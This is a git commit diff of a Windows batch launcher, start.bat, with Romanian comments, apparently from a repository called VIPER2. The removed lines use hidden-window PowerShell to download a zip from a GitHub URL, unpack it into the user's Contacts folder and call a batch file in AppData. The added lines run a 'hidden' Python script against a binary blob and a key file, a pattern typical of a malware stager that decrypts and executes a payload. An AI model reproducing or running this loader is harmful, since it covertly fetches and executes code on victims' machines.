f6039804bd5a34cb0d2524d79d2196fc0d3b80da
MoViper2244 <ilovan738@gmail.com>
2025-09-09 02:40:10 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -4,25 +4,12 @@ if not "%~1"=="h" (
     exit /b
 )
 
-set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/main/"
-set "z=%TEMP%\zo.zip"
 set "d=%USERPROFILE%\Contacts\zo"
 
-:: Crează folderul dacă nu există
-if not exist "%d%" mkdir "%d%"
-
-:: Descarcă zo.zip
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%site_url%zo.zip' -OutFile '%z%'"
-
-:: Dezarhivează
-powershell -WindowStyle Hidden -Command "Expand-Archive '%z%' '%d%' -Force"
-
-:: Șterge zip-ul
-del "%z%" >nul 2>&1
-
-:: Rulează file2.bat din %APPDATA% (care va rula Python)
-if exist "%APPDATA%\file2.bat" (
-    call "%APPDATA%\file2.bat"
+:: Rulează scriptul Python hidden
+cd /d "%d%"
+if exist "sh.py" if exist "voo.bin" if exist "x.txt" (
+    python.exe sh.py -i voo.bin -k x.txt
 )
 
 exit /b 0
